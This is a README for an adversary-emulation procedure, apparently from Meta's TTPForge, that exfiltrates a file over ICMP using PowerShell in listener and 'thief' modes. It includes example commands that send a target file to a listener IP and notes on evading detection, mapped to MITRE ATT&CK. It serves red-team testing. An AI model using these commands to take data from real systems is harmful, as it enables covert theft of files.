# PowerShell ICMP Data Exfiltration

![Meta TTP](https://img.shields.io/badge/Meta_TTP-blue)

This TTP (Tactic, Technique, and Procedure) enables the covert exfiltration
of data from a target system over ICMP. It leverages PowerShell scripts to
send and receive data encapsulated in ICMP packets, commonly used for
network diagnostic purposes. The data is split into chunks and transmitted
sequentially, evading typical data transfer detection mechanisms.

## Arguments

- **listener_ip**: IP address of the listening server

  Default: CHANGEME

- **target_file_path**: Path of the file to be exfiltrated

  Default: "C:/Users/Public/Desktop/stealme.txt"

- **system_type**: The system where TTPForge is executed (`listener` or `thief`)

  Default: listener

- **ttp_dir**: Directory containing the TTP logic

  Default: "C:/Users/Public/.ttpforge/repos/security-ttpcode/ttps/x-meta/windows/exfiltration/icmp-exfil"

- **timeout**: Timeout for the listener in seconds

  Default: 60

## Pre-requisites

1. PowerShell must be installed and properly configured on the target system.

2. The system must have network connectivity to the listener IP.

3. Sufficient permissions to execute the PowerShell scripts and read the target file.

4. If using a firewall, ICMP traffic must be allowed between the target
   and listener systems.

5. TTPForge must be installed on the listener and system to exfil data from.

## Examples

Setup the listener on the receiving system - it will run for a minute unless
data is received.

```powershell
.\ttpforge.exe run forgearmory//exfiltration/icmp-exfil/ttp.yaml`
  -a listener_ip=192.168.1.2 ` # update with the IP address for the listener system
  -a target_file_path=C:\path\to\exfilled\file\on\listener ` # Update this with the path to the file to exfil
  -a system_type=listener
```

Execute the TTP on the system with the data you want to exfiltrate:

```powershell
.\ttpforge.exe run forgearmory//exfiltration/icmp-exfil/ttp.yaml`
  -a listener_ip=192.168.1.2 ` # update with the IP address for the listener system
  -a target_file_path=C:\path\to\file\to\exfil ` # Update this with the path to the file to exfil
  -a system_type=thief
```

## Steps

1. **input-validation**: Validates the input parameters and the existence of
   the necessary files.

2. **execute-ttp**: Executes the TTP, either sending or receiving data
   depending on the system type.

## Accompanying Code

The PowerShell scripts (`thief.ps1` and `listener.ps1`) implement the
functionality to exfiltrate and capture data over ICMP.

They include error handling, logging, and network communication using
the .NET `System.Net` namespace.

## MITRE ATT&CK Mapping

- **Tactics**:
  - TA0010 Exfiltration

- **Techniques**:
  - T1048 Exfiltration Over Alternative Protocol

- **Techniques**:
  - T1048.003 Exfiltration Over Unencrypted Non-C2 Protocol
